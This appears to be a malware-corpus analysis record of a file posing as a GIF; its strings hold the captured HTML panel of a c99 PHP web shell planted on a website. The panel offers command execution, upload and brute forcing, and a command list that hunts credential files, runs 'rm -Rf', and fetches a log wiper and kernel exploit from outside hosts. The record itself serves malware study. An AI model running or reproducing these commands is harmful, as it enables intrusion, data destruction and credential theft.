{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "Open": "May open a file",
            "mkdir": "May create a directory",
            "system": "May run an executable file or a system command on a Mac",
            "windows": "May enumerate application windows"
        },
        "macro": "GIF89;a\n<html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1251\"><meta http-equiv=\"Content-Language\" content=\"en-us\"><title>c99 v0.0.1 SYN-MOD [SYNSTA] @www.charmainesinclairlive.co.uk</title><STYLE>TD { FONT-SIZE: 8pt; COLOR: #ebebeb; FONT-FAMILY: verdana;}BODY { scrollbar-face-color: #800000; scrollbar-shadow-color: #101010; scrollbar-highlight-color: #101010; scrollbar-3dlight-color: #101010; scrollbar-darkshadow-color: #101010; scrollbar-track-color: #101010; scrollbar-arrow-color: #101010; font-family: Verdana;}TD.header { FONT-WEIGHT: normal; FONT-SIZE: 10pt; BACKGROUND: #7d7474; COLOR: white; FONT-FAMILY: verdana;}A { FONT-WEIGHT: normal; COLOR: #dadada; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A.Links { COLOR: #ffffff; TEXT-DECORATION: none;}A.Links:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; TEXT-DECORATION: none;}A:hover { COLOR: #ffffff; TEXT-DECORATION: underline;}.skin0{position:absolute; width:200px; border:2px solid black; background-color:menu; font-family:Verdana; line-height:20px; cursor:default; visibility:hidden;;}.skin1{cursor: default; font: menutext; position: absolute; width: 145px; background-color: menu; border: 1 solid buttonface;visibility:hidden; border: 2 outset buttonhighlight; font-family: Verdana,Geneva, Arial; font-size: 10px; color: black;}.menuitems{padding-left:15px; padding-right:10px;;}input{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}textarea{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}button{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}select{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}option {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}iframe {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}p {MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px; LINE-HEIGHT: 150%}blockquote{ font-size: 8pt; font-family: Courier, Fixed, Arial; border : 8px solid #A9A9A9; padding: 1em; margin-top: 1em; margin-bottom: 5em; margin-right: 3em; margin-left: 4em; background-color: #B7B2B0;}body,td,th { font-family: verdana; color: #d9d9d9; font-size: 11px;}body { background-color: #000000;}</style></head><BODY text=#ffffff bottomMargin=0 bgColor=#000000 leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0><center><TABLE style=\"BORDER-COLLAPSE: collapse\" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1 bordercolor=\"#C0C0C0\"><tr><th width=\"101%\" height=\"15\" nowrap bordercolor=\"#C0C0C0\" valign=\"top\" colspan=\"2\"><p><font face=Webdings size=6><b>!</b></font><a href=\"?\"><font face=\"Verdana\" size=\"5\"><b>c99 v0.0.1 SYN-MOD [SYNSTA]</b></font></a><font face=Webdings size=6><b>!</b></font></p></center></th></tr><tr><td><p align=\"left\"><b>Software:&nbsp;Apache. <a href=\"?act=phpinfo\" target=\"_blank\"><b><u>PHP/5.2.9</u></b></a></b>&nbsp;</p><p align=\"left\"><b>uname -a:&nbsp;Linux wc3.titleworkspace.com 2.6.18-194.32.1.el5 #1 SMP Wed Jan 5 17:53:09 EST 2011 i686</b>&nbsp;</p><b>Disabled functions</b> : <b><font color=green>NONE</font></b><p align=\"left\"><b>We are: uid=608(chsclair) gid=605(chsclair) groups=605(chsclair)<br>context=system_u:system_r:crond_t:s0-s0:c0.c1023<br/>cURL: <b><font color=green>ON</font><br/>MySQL: <b><font color=green>ON</font></b><br/>MSSQL: <b><font color=red>OFF</font><br/>PostgreSQL: <b><font color=red>OFF</font><br/>Oracle: <b><font color=red>OFF</font> </b>&nbsp;</p><p align=\"left\"><b>Safe-mode:&nbsp;<font color=green>OFF (not secure)</font></b></p><p align=\"left\"><a href=\"?act=ls&d=%2F&sort=0a\"><b>/</b></a><a href=\"?act=ls&d=%2Fhome%2F&sort=0a\"><b>home/</b></a><a href=\"?act=ls&d=%2Fhome%2Fchsclair%2F&sort=0a\"><b>chsclair/</b></a><a href=\"?act=ls&d=%2Fhome%2Fchsclair%2Fpublic_html%2F&sort=0a\"><b>public_html/</b></a><a href=\"?act=ls&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F&sort=0a\"><b>thickbox/</b></a>&nbsp;&nbsp;&nbsp;<b><font color=green>drwxr-xr-x</font></b><br><b>Free 240.23 GB of 389.31 GB (61.71%)</b><br><b>Your ip: <a href=http://87.177.180.196>87.177.180.196</a> - Server ip: <a href=http://109.75.162.166>109.75.162.166</a></b><br/><a href=\"?\"><hr><b>[Home]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=search&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b>[Search]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=fsbuff&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b>[Buffer]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=encoder&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b>[Encoder]</b></b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=tools&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b>[Tools]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=processes&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b>[Processes]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=ftpquickbrute&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b>[FTP Brute Forcer]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=security&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b>[Server Security Information]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=sql&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b>[SQL Manager]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=eval&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F&eval=readfile('/etc/passwd');\"><b>[Eval PHP code]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=selfremove\"><b>[Self remove]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=cmd&cmd=cat+%2Fvar%2Fcpanel%2Faccounting.log&cmd_txt=1&submit=Execute\"><b>[Cpanel Logs]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;</p></td></tr></table><br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"100%\" valign=\"top\"><b>Viewing file:&nbsp;&nbsp;&nbsp;&nbsp;[js]&nbsp;jquery-latest.js (93.62 KB) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color=green>-rw-r--r--</font></b><br>Select action/file-type:<br> <a href=\"?act=f&f=jquery-latest.js&ft=info&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b><u>[hex]</u></b></a> (<a href=\"?act=f&f=jquery-latest.js&ft=info&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=jquery-latest.js&ft=html&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b>[html]</b></a> (<a href=\"?act=f&f=jquery-latest.js&ft=html&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=jquery-latest.js&ft=txt&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><font color=green>[txt]</font></a> (<a href=\"?act=f&f=jquery-latest.js&ft=txt&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=jquery-latest.js&ft=code&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b>[Code]</b></a> (<a href=\"?act=f&f=jquery-latest.js&ft=code&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=jquery-latest.js&ft=phpsess&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b>[Session]</b></a> (<a href=\"?act=f&f=jquery-latest.js&ft=phpsess&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=jquery-latest.js&ft=exe&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b>[exe]</b></a> (<a href=\"?act=f&f=jquery-latest.js&ft=exe&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=jquery-latest.js&ft=sdb&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b>[SDB]</b></a> (<a href=\"?act=f&f=jquery-latest.js&ft=sdb&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=jquery-latest.js&ft=img&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b>[gif]</b></a> (<a href=\"?act=f&f=jquery-latest.js&ft=img&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=jquery-latest.js&ft=ini&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b>[ini]</b></a> (<a href=\"?act=f&f=jquery-latest.js&ft=ini&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=jquery-latest.js&ft=download&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b>[download]</b></a> (<a href=\"?act=f&f=jquery-latest.js&ft=download&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=jquery-latest.js&ft=notepad&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b>[rtf]</b></a> (<a href=\"?act=f&f=jquery-latest.js&ft=notepad&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=jquery-latest.js&ft=edit&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b>[change]</b></a> (<a href=\"?act=f&f=jquery-latest.js&ft=edit&white=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\" target=\"_blank\">+</a>) |<hr size=\"1\" noshade><b>Information:</b><table border=0 cellspacing=1 cellpadding=2><tr><td><b>Path</b></td><td> /home/chsclair/public_html/thickbox/jquery-latest.js</td></tr><tr><td><b>Size</b></td><td> 93.62 KB</td></tr><tr><td><b>MD5</b></td><td> 807aac0afa686d7558985eb4840af075</td></tr><tr><td><b>Owner/Group</b></td><td> chsclair/chsclair<tr><td><b>Perms</b></td><td><a href=\"?act=chmod&f=jquery-latest.js&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><font color=green>-rw-r--r--</font></a></td></tr><tr><td><b>Create time</b></td><td> 26/01/2011 08:25:58</td></tr><tr><td><b>Access time</b></td><td> 07/06/2011 01:36:12</td></tr><tr><td><b>MODIFY time</b></td><td> 04/03/2010 17:21:10</td></tr></table><br><b>HEXDUMP PREVIEW</b><table border=0 bgcolor=#666666 cellspacing=1 cellpadding=4><tr><td bgcolor=#666666>00000000<br>00000018<br>00000030<br>00000048<br>00000060<br>00000078<br>00000090<br>000000A8<br></td><td bgcolor=000000>28 66 75 6E 63 74 69 6F 6E 28 29 7B 0A 2F 2A 0A 20 2A 20 6A 51 75 65 72 <br>79 20 31 2E 32 2E 33 61 20 2D 20 4E 65 77 20 57 61 76 65 20 4A 61 76 61 <br>73 63 72 69 70 74 0A 20 2A 0A 20 2A 20 43 6F 70 79 72 69 67 68 74 20 28 <br>63 29 20 32 30 30 37 20 4A 6F 68 6E 20 52 65 73 69 67 20 28 6A 71 75 65 <br>72 79 2E 63 6F 6D 29 0A 20 2A 20 44 75 61 6C 20 6C 69 63 65 6E 73 65 64 <br>20 75 6E 64 65 72 20 74 68 65 20 4D 49 54 20 28 4D 49 54 2D 4C 49 43 45 <br>4E 53 45 2E 74 78 74 29 0A 20 2A 20 61 6E 64 20 47 50 4C 20 28 47 50 4C <br>2D 4C 49 43 45 4E 53 45 2E 74 78 74 29 20 6C 69 63 65 6E 73 65 73 2E 0A <br></td><td bgcolor=000000>(function(){&nbsp;/*&nbsp;&nbsp;*&nbsp;jQuer<br>y&nbsp;1.2.3a&nbsp;-&nbsp;New&nbsp;Wave&nbsp;Java<br>script&nbsp;&nbsp;*&nbsp;&nbsp;*&nbsp;Copyright&nbsp;(<br>c)&nbsp;2007&nbsp;John&nbsp;Resig&nbsp;(jque<br>ry.com)&nbsp;&nbsp;*&nbsp;Dual&nbsp;licensed<br>&nbsp;under&nbsp;the&nbsp;MIT&nbsp;(MIT-LICE<br>NSE.txt)&nbsp;&nbsp;*&nbsp;and&nbsp;GPL&nbsp;(GPL<br>-LICENSE.txt)&nbsp;licenses.&nbsp;<br></td></tr></table><br><b>Base64 Encode</b><br><textarea cols=80 rows=10></textarea><br><br><b>HEXDUMP:</b><nobr> [<a href=\"?act=f&f=jquery-latest.js&ft=info&fullhexdump=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\">Full</a>] [<a href=\"?act=f&f=jquery-latest.js&ft=info&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\">Preview</a>]<br><b>Base64: </b>\n<nobr>[<a href=\"?act=f&f=jquery-latest.js&ft=info&base64=1&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\">Encode</a>]&nbsp;</nobr>\n<nobr>[<a href=\"?act=f&f=jquery-latest.js&ft=info&base64=2&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\">+chunk</a>]&nbsp;</nobr>\n<nobr>[<a href=\"?act=f&f=jquery-latest.js&ft=info&base64=3&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\">+chunk+quotes</a>]&nbsp;</nobr>\n<nobr>[<a href=\"?act=f&f=jquery-latest.js&ft=info&base64=4&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\">Decode</a>]&nbsp;</nobr>\n<P>\n</td></tr></table><a bookmark=\"minipanel\"><br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1>\n<tr><td width=\"100%\" height=\"1\" valign=\"top\"><center><form action=\"?\"><input type=hidden name=act value=\"cmd\"><br/><b>CMD:</b> <input type=hidden name=\"d\" value=\"/home/chsclair/public_html/thickbox/\"><input type=\"text\" name=\"cmd\" size=\"50\" value=\"\"><input type=hidden name=\"cmd_txt\" value=\"1\">&nbsp;<input type=submit name=submit value=\"Execute\"></form></td></tr></TABLE>\n<br>\n<TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1>\n<tr>\n <td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: <a href=\"?act=search&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b>Search</b></a> ::</b><form method=\"POST\"><input type=hidden name=act value=\"search\"><input type=hidden name=\"d\" value=\"/home/chsclair/public_html/thickbox/\"><input type=\"text\" name=\"search_name\" size=\"29\" value=\"(.*)\">&nbsp;<input type=\"checkbox\" name=\"search_name_regexp\" value=\"1\"  checked> - regexp&nbsp;<input type=submit name=submit value=\"Search\"></form></center></p></td>\n <td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: <a href=\"?act=upload&d=%2Fhome%2Fchsclair%2Fpublic_html%2Fthickbox%2F\"><b>Upload</b></a> ::</b><form method=\"POST\" ENCTYPE=\"multipart/form-data\"><input type=hidden name=act value=\"upload\"><input type=\"file\" name=\"uploadfile\"><input type=hidden name=\"miniform\" value=\"1\">&nbsp;<input type=submit name=submit value=\"Upload\"><br><font color=green>[ ok ]</font></form></center></td>\n</tr>\n</table>\n\n\n<br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Remote File Grabber ::</b><br/><br/><form action=\"?grab=true\"   method=\"post\">File Url:<input name=\"from\"> New File Name: <input name=\"to\"> <input type=\"submit\" value=\"Grab!\"></center></td></tr></table>\n<br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Make Dir ::<p><form action=\"?\"><input type=hidden name=act value=\"mkdir\"><input type=hidden name=\"d\" value=\"/home/chsclair/public_html/thickbox/\"><input type=\"text\" name=\"mkdir\" size=\"50\" value=\"/home/chsclair/public_html/thickbox/\">&nbsp;<input type=submit value=\"Create\"><br><font color=green>[ ok ]</font></form></center></td><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Make File ::</b><form method=\"POST\"><input type=hidden name=act value=\"mkfile\"><input type=hidden name=\"d\" value=\"/home/chsclair/public_html/thickbox/\"><input type=\"text\" name=\"mkfile\" size=\"50\" value=\"/home/chsclair/public_html/thickbox/\"><input type=hidden name=\"ft\" value=\"edit\">&nbsp;<input type=submit value=\"Create\"><br><font color=green>[ ok ]</font></form></center></td></tr></table>\n\n<br>\n<TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"116\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1>\n<tr>\n  <td width=\"50%\" height=\"83\" valign=\"top\"><center>\n    <div align=\"center\"><br/><b>:: Useful Commands ::</b>\n    </div>\n    <form action=\"?\">\n      <div align=\"center\">\n        <input type=hidden name=act value=\"cmd\">\n        <input type=hidden name=\"d\" value=\"/home/chsclair/public_html/thickbox/\">\n <SELECT NAME=\"cmd\">\n           <OPTION VALUE=\"tar -cvf NEWTAR!!.tar -c /home/chsclair/public_html/td-admin/modules/gallery_management/images\n\">Tar your current directory. (Only works if your dir. is writable)\n           <OPTION VALUE=\"pwd\">List your current directory\n           <OPTION VALUE=\"ls -lia\">List you current directory's files, folders, & permissions\n           <OPTION VALUE=\"find / -type f -perm -04000 -ls\">find suid files\n           <OPTION VALUE=\"find . -type f -perm -04000 -ls\">find suid files in current dir\n           <OPTION VALUE=\"find / -type f -perm -02000 -ls\">find sgid files\n           <OPTION VALUE=\"find . -type f -perm -02000 -ls\">find sgid files in current dir\n           <OPTION VALUE=\"uname -a\">Kernel version\n           <OPTION VALUE=\"w\">Logged in users\n           <OPTION VALUE=\"lastlog\">Last users to connect\n           <OPTION VALUE=\"find /bin /usr/bin /usr/local/bin /sbin /usr/sbin /usr/local/sbin -perm -4000 2> /dev/null\">Suid bins\n           <OPTION VALUE=\"cut -d: -f1,2,3 /etc/passwd | grep ::\">Users without passwords\n                    <OPTION VALUE=\"find /etc/ -type f -perm -o+w 2> /dev/null\">Is /etc/ writable?\n                    <OPTION VALUE=\"which wget curl w3m lynx\">We got downloaders? :D\n                    <OPTION VALUE=\"cat /proc/version /proc/cpuinfo\">CpuInfo\n                    <OPTION VALUE=\"netstat -atup | grep IST\">Open ports\n                    <OPTION VALUE=\"locate gcc\">Is gcc installed?\n\t\t    <OPTION VALUE=\"find / -type f -name config.inc.php\">find config.inc.php files\n<OPTION VALUE=\"find . -type f -name config.inc.php\">find config.inc.php files in current dir\n<OPTION VALUE=\"find / -type f -name \"config*\">find config* files\n<OPTION VALUE=\"find . -type f -name \"config*\">find config* files in current dir\n<OPTION VALUE=\"find / -type f -perm -2 -ls\">find all writable files\n<OPTION VALUE=\"find . -type f -perm -2 -ls\">find all writable files in current dir\n<OPTION VALUE=\"find /  -type d -perm -2 -ls\">find all writable directories\n<OPTION VALUE=\"find . -type d -perm -2 -ls\">find all writable directories in current dir\n<OPTION VALUE=\"find / -perm -2 -ls\">find all writable directories and files\n<OPTION VALUE=\"find . -perm -2 -ls\">find all writable directories and files in current dir\n<OPTION VALUE=\"find / -type f -name service.pwd\">find all service.pwd files\n<OPTION VALUE=\"find . -type f -name service.pwd\">find service.pwd files in current dir'\n<OPTION VALUE=\"find / -type f -name .htpasswd\">find all .htpasswd files\n<OPTION VALUE=\"find . -type f -name .htpasswd\">find .htpasswd files in current dir\n<OPTION VALUE=\"find / -type f -name .bash_history\">find all .bash_history files\n<OPTION VALUE=\"find . -type f -name .bash_history\">find .bash_history files in current dir\n<OPTION VALUE=\"find / -type f -name .mysql_history\">find all .mysql_history files\n<OPTION VALUE=\"find . -type f -name .mysql_history\">find .mysql_history files in current dir\n<OPTION VALUE=\"find / -type f -name .fetchmailrc\">find all .fetchmailrc files\n<OPTION VALUE=\"find . -type f -name .fetchmailrc\">find .fetchmailrc files in current dir\n<OPTION VALUE=\"lsattr -va\">list file attributes on a Linux second extended file system\n\t\t\t\n                    <OPTION VALUE=\"rm -Rf\">Format this box.\n                    <OPTION VALUE=\"wget http://www.packetstormsecurity.org/UNIX/penetration/log-wipers/zap2.c\">WIPELOGS PT1 (If wget installed)\n                    <OPTION VALUE=\"gcc zap2.c -o zap2\">WIPELOGS PT2\n                    <OPTION VALUE=\"./zap2\">WIPELOGS PT3\n                    <OPTION VALUE=\"wget http://ftp.powernet.com.tr/supermail/debug/k3\">Kernel attack (Krad.c) PT1 (If wget installed)\n                    <OPTION VALUE=\"./k3 1\">Kernel attack (Krad.c) PT2 (L1)\n                    <OPTION VALUE=\"./k3 2\">Kernel attack (Krad.c) PT2 (L2)\n                    <OPTION VALUE=\"./k3 3\">Kernel attack (Krad.c) PT2 (L3)\n                    <OPTION VALUE=\"./k3 4\">Kernel attack (Krad.c) PT2 (L4)\n                    <OPTION VALUE=\"./k3 5\">Kernel attack (Krad.c) PT2 (L5)\n                  </SELECT>\n        <input type=hidden name=\"cmd_txt\" value=\"1\">\n        &nbsp;\n        <input type=submit name=submit value=\"Execute\"></div>\n    </form>\n    </td>\n  <td width=\"50%\" height=\"83\" valign=\"top\"><center>\n  <center><br/><b>:: Kernel Info :: </b>\n<form action=http://google.com/search name=f><input type=hidden name=client value=\"firefox-a\"><input type=hidden name=rls value=\"org.mozilla:en-US:official_s\"><input type=hidden name=hl value=en><input id=sf maxLength=256 name=q value=\"Linux wc3.titleworkspace.com 2.6.18-194.32.1.el5 #1 SMP Wed Jan 5 17:53:09\nEST 2011 i686\" size=30>&nbsp;<input type=submit value=\"Search\" name=btnG></form>\n</center>\n    </td>\n</tr></TABLE><br>\n<TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"116\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1>\n<tr>\n  <td width=\"50%\" height=\"83\" valign=\"top\"><center>\n    <div align=\"center\">Php Safe-Mode Bypass (Read Files)\n    </div><br>\n    <form action=\"?\">\n      <div align=\"center\">\n      File: <input type=\"text\" name=\"file\" method=\"get\"> <input type=\"submit\" value=\"Read File\"><br><br> eg: /etc/passwd<br>\n      \n      \n      \n           \n      \n      \n      \t\n\t\n          <br>\n      </div>\n    </form>\n    </td>\n  <td width=\"50%\" height=\"83\" valign=\"top\"><center>\n   <center>Php Safe-Mode Bypass (List Directories):     <form action=\"?\">\n      <div align=\"center\"><br>\n      Dir: <input type=\"text\" name=\"directory\" method=\"get\"> <input type=\"submit\" value=\"List Directory\"><br><br> eg: /etc/<br>\n\n    </form></center>\n    </td>\n</tr></TABLE>\n<br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Go Dir ::</b><form action=\"?\"><input type=hidden name=act value=\"ls\"><input type=\"text\" name=\"d\" size=\"50\" value=\"/home/chsclair/public_html/thickbox/\">&nbsp;<input type=submit value=\"Go\"></form></center></td><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Go File ::</b><form action=\"?\"><input type=hidden name=act value=\"gofile\"><input type=hidden name=\"d\" value=\"/home/chsclair/public_html/thickbox/\"><input type=\"text\" name=\"f\" size=\"50\" value=\"/home/chsclair/public_html/thickbox/\">&nbsp;<input type=submit value=\"Go\"></form></center></td></tr></table>\n</td>\n</tr>\n</TABLE>\n<br><TABLE style=\"BORDER-COLLAPSE: collapse\" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"990\" height=\"1\" valign=\"top\"><p align=\"center\"><b>--[ c99shell modded by synsta. | Page generation time: 0.0157 ]--</p></td></tr></table>\n<br/></body></html>"
    },
    "filename": "VirusShare_01314ffa371176bfb965937e74883db2",
    "filesize": 150442,
    "filetype": "GIF image data 3425 x 15370",
    "hashes": {
        "md5": "01314ffa371176bfb965937e74883db2",
        "sha1": "dd8caf946300be84e9bfea871991ea94db0d22d2",
        "sha256": "f80929a38ebef6b4cfb3dab3d4458f48381709e56aa52723f10cc2dba92ff979"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "GIF89;a",
            "<html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1251\"><meta http-equiv=\"Content-Language\" content=\"en-us\"><title>c99 v0.0.1 SYN-MOD [SYNSTA] @www.charmainesinclairlive.co.uk</title><STYLE>TD { FONT-SIZE: 8pt; COLOR: #ebebeb; FONT-FAMILY: verdana;}BODY { scrollbar-face-color: #800000; scrollbar-shadow-color: #101010; scrollbar-highlight-color: #101010; scrollbar-3dlight-color: #101010; scrollbar-darkshadow-color: #101010; scrollbar-track-color: #101010; scrollbar-arrow-color: #101010; font-family: Verdana;}TD.header { FONT-WEIGHT: normal; FONT-SIZE: 10pt; BACKGROUND: #7d7474; COLOR: white; FONT-FAMILY: verdana;}A { FONT-WEIGHT: normal; COLOR: #dadada; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A.Links { COLOR: #ffffff; TEXT-DECORATION: none;}A.Links:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; TEXT-DECORATION: none;}A:hover { COLOR: #ffffff; TEXT-DECORATION: underline;}.skin0{position:absolute; width:200px; border:2px solid black; background-color:menu; font-family:Verdana; line-height:20px; cursor:default; visibility:hidden;;}.skin1{cursor: default; font: menutext; position: absolute; width: 145px; background-color: menu; border: 1 solid buttonface;visibility:hidden; border: 2 outset buttonhighlight; font-family: Verdana,Geneva, Arial; font-size: 10px; color: black;}.menuitems{padding-left:15px; padding-right:10px;;}input{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}textarea{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}button{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}select{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}option {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}iframe {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}p {MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px; LINE-HEIGHT: 150%}blockquote{ font-size: 8pt; font-family: Courier, Fixed, Arial; border : 8px solid #A9A9A9; padding: 1em; margin-top: 1em; margin-bottom: 5em; margin-right: 3em; margin-left: 4em; background-color: #B7B2B0;}body,td,th { font-family: verdana; color: #d9d9d9; font-size: 11px;}body { background-color: #000000;}</style></head><BODY text=#ffffff bottomMargin=0 bgColor=#000000 leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0><center><TABLE style=\"BORDER-COLLAPSE: collapse\" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1 